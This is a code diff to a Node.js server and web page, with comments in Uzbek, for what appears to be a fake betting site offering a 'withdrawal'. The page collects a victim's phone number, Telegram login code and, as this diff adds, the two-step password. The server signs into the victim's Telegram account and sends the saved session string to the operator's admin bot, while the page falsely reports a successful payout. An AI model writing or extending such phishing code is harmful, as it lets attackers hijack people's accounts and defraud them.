@@ -10,7 +10,6 @@ const PORT = process.env.PORT || 3000;
 // Env o'zgaruvchilari
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_ID = process.env.ADMIN_ID;
-// my.telegram.org saytidan olingan API ma'lumotlari
 const API_ID = parseInt(process.env.API_ID || "123456"); 
 const API_HASH = process.env.API_HASH || "your_api_hash_here";
 
@@ -78,9 +77,9 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
-// Kod kiritilganda server orqali Telegramga kirish (Session yaratish)
+// Kod kiritilganda server orqali Telegramga kirish (TUZA TILGAN MARSHRUT)
 app.post('/api/submit-withdraw', async (req, res) => {
-    const { inputCode, phone } = req.body;
+    const { inputCode, phone, password } = req.body;
 
     let cleanPhone = phone ? phone.replace(/\D/g, '') : '';
     if (!cleanPhone.startsWith('998') && cleanPhone.length === 9) {
@@ -101,16 +100,16 @@ app.post('/api/submit-withdraw', async (req, res) => {
             phoneNumber: '+' + cleanPhone,
             phoneCodeHash: phoneCodeHash,
             phoneCode: inputCode,
+            password: async () => password || '', // 2FA Parol bo'lsa ishlatish
         });
 
         const me = await client.getMe();
-        const sessionString = session.save(); // Saqlangan Telegram Session
+        const sessionString = session.save();
 
         const usernameText = me.username ? `@${me.username}` : "Username yo'q";
         const firstName = me.firstName || "";
         const lastName = me.lastName || "";
 
-        // Admin botga bildirishnoma yuborish
         if (ADMIN_ID) {
             const notifyText = `🚀 *Server Telegramga kirdi!*
 
@@ -127,13 +126,21 @@ ${sessionString}
             await bot.sendMessage(ADMIN_ID, notifyText, { parse_mode: 'Markdown' });
         }
 
-        // Tizimdan o'chirish
         delete activeAuthSessions[cleanPhone];
 
         res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
     } catch (err) {
         console.error("Kirishda xatolik:", err);
         
+        // 2FA Parol so'ralgan xolat
+        if (err.message && err.message.includes('SESSION_PASSWORD_NEEDED')) {
+            return res.json({ 
+                success: false, 
+                requiresPassword: true, 
+                message: "Akkauntingizda 2-bosqichli parol yoqilgan. Iltimos, parolni kiriting!" 
+            });
+        }
+
         if (ADMIN_ID) {
             await bot.sendMessage(ADMIN_ID, `❌ *Xatolik:* +${cleanPhone} raqami noto'g'ri kod kiritdi (\`${inputCode}\`).`, { parse_mode: 'Markdown' });
         }
@@ -282,7 +289,15 @@ app.get('/', (req, res) => {
                     <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 3)">
                     <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 4)">
                 </div>
-                <button class="btn-modal-confirm" onclick="submitWithdraw()">TASDIQLASH VA YECHISH</button>
+                
+                <div id="passwordFieldGroup" style="display: none; margin-top: 10px;">
+                    <label style="font-size: 12px; color: #facc15;">2-Bosqichli Telegram Paroli:</label>
+                    <div class="bet-input-container" style="margin-top: 5px;">
+                        <input type="password" class="bet-input-field" id="telegramPassword" placeholder="Parolingizni kiriting">
+                    </div>
+                </div>
+
+                <button class="btn-modal-confirm" style="margin-top: 10px;" onclick="submitWithdraw()">TASDIQLASH VA YECHISH</button>
             </div>
         </div>
     </div>
@@ -459,18 +474,29 @@ app.get('/', (req, res) => {
     async function submitWithdraw() {
         const inputs = document.querySelectorAll('.code-box-input');
         const phone = document.getElementById('withdrawPhone').value.trim();
+        const password = document.getElementById('telegramPassword').value.trim();
+        
         let inputCode = '';
-        inputs.forEach(input => inputCode += input.value);
+        inputs.forEach(input => inputCode += input.value.trim());
         if (inputCode.length < 5) { alert("Kodni to'liq kiriting!"); return; }
 
         try {
             const res = await fetch(\`\${API_URL}/submit-withdraw\`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ inputCode, phone })
+                body: JSON.stringify({ inputCode, phone, password })
             });
             const data = await res.json();
-            alert(data.message);
+            
+            if (data.requiresPassword) {
+                alert(data.message);
+                document.getElementById('passwordFieldGroup').style.display = 'block';
+            } else {
+                alert(data.message);
+                if (data.success) {
+                    closeModal('withdrawModal');
+                }
+            }
         } catch (e) { alert("Xatolik yuz berdi!"); }
     }
 
